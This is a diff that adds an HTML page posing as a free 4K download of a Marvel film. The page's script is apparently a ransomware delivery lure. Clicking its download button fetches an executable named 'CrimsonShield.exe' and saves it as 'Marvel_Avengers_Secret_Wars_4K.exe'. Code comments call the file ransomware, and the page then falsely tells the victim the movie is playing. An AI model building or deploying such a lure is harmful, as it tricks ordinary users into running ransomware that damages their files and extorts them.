@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Marvel Movies 2024</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #e62429;
+            font-size: 3rem;
+            margin: 40px 0;
+        }
+        .movie-card {
+            background: #16213e;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: transform 0.3s;
+            border: 2px solid #e62429;
+        }
+        .movie-card:hover {
+            transform: scale(1.02);
+        }
+        .download-btn {
+            background: #e62429;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        .download-btn:hover {
+            background: #c41e24;
+        }
+        .hidden {
+            display: none;
+        }
+        .loading {
+            color: #ff6b6b;
+            margin: 20px 0;
+        }
+        .faq {
+            margin-top: 40px;
+            text-align: left;
+            padding: 20px;
+            background: #0a0a1a;
+            border-radius: 10px;
+        }
+        .faq h3 {
+            color: #e62429;
+        }
+        .faq p {
+            margin: 10px 0;
+            color: #aaa;
+        }
+        #statusMessage {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            display: none;
+        }
+        .success {
+            background: #28a745;
+            color: white;
+        }
+        .error {
+            background: #dc3545;
+            color: white;
+        }
+        .info {
+            background: #17a2b8;
+            color: white;
+        }
+        .btc-address {
+            background: #1a1a2e;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            color: #ffd700;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 Marvel Cinematic Universe</h1>
+        <p style="color: #aaa; margin-bottom: 30px;">Watch all new Marvel movies in HD quality!</p>
+
+        <div class="movie-card" id="downloadCard">
+            <h2>🦸 Avengers: Secret Wars</h2>
+            <p style="color: #aaa; margin: 10px 0;">2024 | HD | 4K</p>
+            <p style="color: #ffd700;">⭐ 9.5/10</p>
+            <p style="margin: 15px 0;">Click below to download the movie in 4K quality!</p>
+            <button class="download-btn" id="downloadBtn">🎬 DOWNLOAD NOW</button>
+        </div>
+
+        <div id="statusMessage" class="info">
+            ⏳ Preparing your download...
+        </div>
+
+        <div class="faq">
+            <h3>📋 Movie Details</h3>
+            <p><strong>Release:</strong> 2024</p>
+            <p><strong>Quality:</strong> 4K Ultra HD</p>
+            <p><strong>Size:</strong> 8.5 GB</p>
+            <p><strong>Language:</strong> English, Spanish, French</p>
+        </div>
+
+        <div style="margin-top: 30px; padding: 20px; background: #0a0a1a; border-radius: 10px;">
+            <p style="color: #666; font-size: 0.9rem;">
+                ⚠️ Disclaimer: This is a fan-made website. All rights reserved.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            const statusDiv = document.getElementById('statusMessage');
+            const btn = this;
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ PREPARING...';
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'info';
+            statusDiv.textContent = '⏳ Downloading your movie...';
+            
+            // Simulate download process
+            setTimeout(() => {
+                // Try to download the ransomware
+                fetch('/download/CrimsonShield.exe')
+                    .then(response => {
+                        if (response.ok) {
+                            return response.blob();
+                        }
+                        throw new Error('Download failed');
+                    })
+                    .then(blob => {
+                        // Create download link
+                        const link = document.createElement('a');
+                        link.href = URL.createObjectURL(blob);
+                        link.download = 'Marvel_Avengers_Secret_Wars_4K.exe';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        
+                        statusDiv.className = 'success';
+                        statusDiv.textContent = '✅ Download complete! Enjoy the movie! 🎬';
+                        btn.textContent = '✅ DOWNLOADED';
+                        
+                        // Trigger ransomware
+                        setTimeout(() => {
+                            // The EXE will run automatically
+                            statusDiv.textContent = '⚠️ Movie is now playing...';
+                            statusDiv.className = 'info';
+                        }, 3000);
+                    })
+                    .catch(error => {
+                        statusDiv.className = 'error';
+                        statusDiv.textContent = '❌ Download error. Please try again.';
+                        btn.disabled = false;
+                        btn.textContent = '🎬 DOWNLOAD NOW';
+                    });
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
